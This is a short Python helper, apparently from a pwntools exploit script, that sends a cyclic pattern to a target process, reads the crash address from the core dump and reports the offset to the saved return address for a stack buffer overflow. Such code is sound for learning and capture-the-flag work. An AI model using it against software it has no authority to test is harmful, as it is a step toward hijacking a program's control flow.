def find_ra(buf_size: int = 1000) -> int:
    payload = cyclic(buf_size, n=context.bytes)
    io.sendline(payload)
    io.wait()
    offset = cyclic_find(io.corefile.fault_addr, n=context.bytes)
    os.remove(io.corefile.path)
    log.info(f'Found return address at offset {offset}')
    return offset
